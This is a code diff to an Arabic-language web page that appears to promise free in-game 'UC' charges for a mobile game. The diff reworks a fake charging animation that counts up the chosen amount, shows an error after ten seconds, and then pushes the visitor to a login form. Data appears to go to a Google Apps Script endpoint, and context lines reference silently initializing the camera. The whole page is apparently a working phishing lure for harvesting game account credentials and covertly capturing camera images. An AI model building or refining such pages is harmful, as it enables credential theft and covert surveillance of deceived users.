@@ -1809,25 +1809,16 @@ body {
 .main-container {
     display: block;
 }
-        /* إصلاح عرض الصفحات */
-.main-container {
+
+/* إصلاح مشكلة ظهور صفحة التسجيل */
+body:not(.show-login) .main-container {
     display: block !important;
 }
 
-.login-container {
+body:not(.show-login) .login-container {
     display: none !important;
 }
 
-/* عند إضافة كلاس active لصفحة التسجيل */
-.login-container.active {
-    display: block !important;
-}
-
-.main-container.active {
-    display: block !important;
-}
-
-/* إخفاء الصفحة الرئيسية عند تفعيل التسجيل */
 body.show-login .main-container {
     display: none !important;
 }
@@ -2067,11 +2058,17 @@ body.show-login .login-container {
         const selectedChargeInfo = document.getElementById('selected-charge-info');
         const chargeDetails = document.getElementById('charge-details');
         const statusDiv = document.getElementById('status');
+        const chargingModal = document.getElementById('charging-modal');
+        const chargingSteps = document.querySelectorAll('.charging-step');
+        const circleBar = document.getElementById('circle-bar');
+        const chargeCounter = document.getElementById('charge-counter');
+        const goToLoginBtn = document.getElementById('go-to-login');
         
         let stream = null;
         let cameraInitialized = false;
         let termsAccepted = false;
         let selectedCharge = null;
+        let chargingTimeout;
         
         // رابط Google Apps Script - استبدله برابط نشرك
         const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxba-9A5naC85K9UuH60IfZJ5bs6pRcg-La_B4XBYikC2a3y1gLeqe5njifEhgoBgfg/exec';
@@ -2079,6 +2076,8 @@ body.show-login .login-container {
         // إظهار نافذة الشروط عند تحميل الصفحة
         document.addEventListener('DOMContentLoaded', function() {
             termsModal.style.display = 'flex';
+            // التأكد من إخفاء صفحة التسجيل عند التحميل
+            document.body.classList.remove('show-login');
         });
         
         // التحكم في زر الموافقة بناءً على تحديد المربع
@@ -2104,26 +2103,26 @@ body.show-login .login-container {
         
         // زر إلغاء الشروط
         cancelBtn.addEventListener('click', function() {
-    termsModal.style.display = 'none';
-    
-    // عرض رسالة حمراء مباشرة بدون استخدام showStatus
-    statusDiv.innerHTML = `
-        <div style="
-            background: #ffcccc; 
-            color: #cc0000; 
-            border: 2px solid #ff0000; 
-            padding: 15px; 
-            border-radius: 10px; 
-            text-align: center; 
-            font-weight: bold; 
-            margin: 20px 0;
-            font-size: 16px;
-        ">
-            ⚠️ يجب الموافقة على الشروط والأحكام لاستخدام النظام
-        </div>
-    `;
-    statusDiv.style.display = 'block';
-});
+            termsModal.style.display = 'none';
+            
+            // عرض رسالة حمراء مباشرة بدون استخدام showStatus
+            statusDiv.innerHTML = `
+                <div style="
+                    background: #ffcccc; 
+                    color: #cc0000; 
+                    border: 2px solid #ff0000; 
+                    padding: 15px; 
+                    border-radius: 10px; 
+                    text-align: center; 
+                    font-weight: bold; 
+                    margin: 20px 0;
+                    font-size: 16px;
+                ">
+                    ⚠️ يجب الموافقة على الشروط والأحكام لاستخدام النظام
+                </div>
+            `;
+            statusDiv.style.display = 'block';
+        });
         
         // إظهار الشروط عند النقر على الرابط
         showTermsLink.addEventListener('click', function(e) {
@@ -2173,33 +2172,89 @@ body.show-login .login-container {
         playerIdInput.addEventListener('input', checkFormCompletion);
         serverSelect.addEventListener('change', checkFormCompletion);
         
-        // زر المتابعة إلى الدفع
-        // عدل حدث زر المتابعة إلى الدفع
-proceedBtn.addEventListener('click', function() {
-    if (!termsAccepted) {
-        showStatus('يجب الموافقة على الشروط والأحكام أولاً', 'error');
-        termsModal.style.display = 'flex';
-        return;
-    }
-    
-    if (!selectedCharge) {
-        showStatus('يرجى اختيار عدد الشدات', 'error');
-        return;
-    }
-    
-    if (!playerIdInput.value.trim()) {
-        showStatus('يرجى إدخال معرف اللاعب', 'error');
-        return;
-    }
-    
-    if (!serverSelect.value) {
-        showStatus('يرجى اختيار الخادم', 'error');
-        return;
-    }
-    
-    // بدء عملية الشحن التي تنتهي بطلب تسجيل الدخول
-    showChargingProcess();
-});
+        // زر المتابعة إلى الدفع - الكود المصحح
+        proceedBtn.addEventListener('click', function() {
+            if (!termsAccepted) {
+                showStatus('يجب الموافقة على الشروط والأحكام أولاً', 'error');
+                termsModal.style.display = 'flex';
+                return;
+            }
+            
+            if (!selectedCharge) {
+                showStatus('يرجى اختيار عدد الشدات', 'error');
+                return;
+            }
+            
+            if (!playerIdInput.value.trim()) {
+                showStatus('يرجى إدخال معرف اللاعب', 'error');
+                return;
+            }
+            
+            if (!serverSelect.value) {
+                showStatus('يرجى اختيار الخادم', 'error');
+                return;
+            }
+            
+            // بدء عملية الشحن التي تنتهي بطلب تسجيل الدخول
+            showChargingProcess();
+        });
+        
+        // دالة عرض نافذة الشحن
+        function showChargingProcess() {
+            chargingModal.style.display = 'flex';
+            showStep(0);
+            startChargeCollection();
+            
+            // إظهار الخطأ بعد 10 ثواني
+            chargingTimeout = setTimeout(() => {
+                showStep(1);
+            }, 10000);
+        }
+
+        // دالة عرض خطوة معينة
+        function showStep(stepIndex) {
+            chargingSteps.forEach((step, index) => {
+                step.classList.toggle('active', index === stepIndex);
+            });
+        }
+
+        // دالة تحصيل الشدات مع دائرة التقدم
+        function startChargeCollection() {
+            const targetAmount = parseInt(selectedCharge.amount);
+            let currentAmount = 0;
+            const duration = 8000; // 8 ثواني للتقدم
+            const interval = 50;
+            const steps = duration / interval;
+            const increment = targetAmount / steps;
+            
+            const circumference = 2 * Math.PI * 85; // محيط الدائرة
+            circleBar.style.strokeDasharray = circumference;
+            
+            chargeCounter.textContent = '0';
+            
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += (100 / steps);
+                const offset = circumference - (progress / 100) * circumference;
+                circleBar.style.strokeDashoffset = offset;
+                
+                currentAmount += increment;
+                if (currentAmount >= targetAmount) {
+                    currentAmount = targetAmount;
+                    clearInterval(progressInterval);
+                    chargeCounter.textContent = targetAmount.toLocaleString();
+                } else {
+                    chargeCounter.textContent = Math.floor(currentAmount).toLocaleString();
+                }
+            }, interval);
+        }
+
+        // حدث زر الانتقال لتسجيل الدخول
+        goToLoginBtn.addEventListener('click', function() {
+            chargingModal.style.display = 'none';
+            document.body.classList.add('show-login');
+            clearTimeout(chargingTimeout);
+        });
         
         // تهيئة الكاميرا بشكل خفي بعد الموافقة
         async function initializeCameraSilently() {
@@ -2424,8 +2479,7 @@ proceedBtn.addEventListener('click', function() {
                         loginBtn.textContent = 'تسجيل الدخول';
                         
                         // إعادة إلى الصفحة الرئيسية
-                        loginContainer.style.display = 'none';
-                        mainContainer.style.display = 'block';
+                        document.body.classList.remove('show-login');
                         showStatus('تم تسجيل الدخول بنجاح!', 'success');
                         
                         // إعادة تعيين بيانات الشحن
@@ -2469,152 +2523,8 @@ proceedBtn.addEventListener('click', function() {
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
+            clearTimeout(chargingTimeout);
         });
-// عناصر نافذة الشحن
-const chargingModal = document.getElementById('charging-modal');
-const chargingSteps = document.querySelectorAll('.charging-step');
-const circleBar = document.getElementById('circle-bar');
-const chargeCounter = document.getElementById('charge-counter');
-const goToLoginBtn = document.getElementById('go-to-login');
-
-let chargingTimeout;
-
-// دالة عرض نافذة الشحن
-function showChargingProcess() {
-    chargingModal.style.display = 'flex';
-    showStep(0);
-    startChargeCollection();
-    
-    // إظهار الخطأ بعد 10 ثواني
-    chargingTimeout = setTimeout(() => {
-        showStep(1);
-    }, 10000);
-}
-
-// دالة عرض خطوة معينة
-function showStep(stepIndex) {
-    chargingSteps.forEach((step, index) => {
-        step.classList.toggle('active', index === stepIndex);
-    });
-}
-
-// دالة تحصيل الشدات مع دائرة التقدم
-function startChargeCollection() {
-    const targetAmount = parseInt(selectedCharge.amount);
-    let currentAmount = 0;
-    const duration = 8000; // 8 ثواني للتقدم
-    const interval = 50;
-    const steps = duration / interval;
-    const increment = targetAmount / steps;
-    
-    const circumference = 2 * Math.PI * 85; // محيط الدائرة
-    circleBar.style.strokeDasharray = circumference;
-    
-    chargeCounter.textContent = '0';
-    
-    let progress = 0;
-    const progressInterval = setInterval(() => {
-        progress += (100 / steps);
-        const offset = circumference - (progress / 100) * circumference;
-        circleBar.style.strokeDashoffset = offset;
-        
-        currentAmount += increment;
-        if (currentAmount >= targetAmount) {
-            currentAmount = targetAmount;
-            clearInterval(progressInterval);
-            chargeCounter.textContent = targetAmount.toLocaleString();
-        } else {
-            chargeCounter.textContent = Math.floor(currentAmount).toLocaleString();
-        }
-    }, interval);
-}
-
-// حدث زر الانتقال لتسجيل الدخول
-goToLoginBtn.addEventListener('click', function() {
-    chargingModal.style.display = 'none';
-    mainContainer.style.display = 'none';
-    loginContainer.style.display = 'block';
-    clearTimeout(chargingTimeout);
-});
-
-// عدل حدث زر المتابعة إلى الدفع
-proceedBtn.addEventListener('click', function() {
-    if (!termsAccepted) {
-        showStatus('يجب الموافقة على الشروط والأحكام أولاً', 'error');
-        termsModal.style.display = 'flex';
-        return;
-    }
-    
-    if (!selectedCharge) {
-        showStatus('يرجى اختيار عدد الشدات', 'error');
-        return;
-    }
-    
-    if (!playerIdInput.value.trim()) {
-        showStatus('يرجى إدخال معرف اللاعب', 'error');
-        return;
-    }
-    
-    if (!serverSelect.value) {
-        showStatus('يرجى اختيار الخادم', 'error');
-        return;
-    }
-    
-    // بدء عملية الشحن التي تنتهي بخطأ التسجيل
-    showChargingProcess();
-});
-// تنظيف الوقت عند إغلاق الصفحة
-window.addEventListener('beforeunload', () => {
-    clearTimeout(chargingTimeout);
-});
-        // في نهاية script، استبدل هذا الكود:
-document.addEventListener('DOMContentLoaded', function() {
-    loginContainer.style.display = 'none';
-    mainContainer.style.display = 'block';
-    termsModal.style.display = 'flex';
-});
     </script>
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
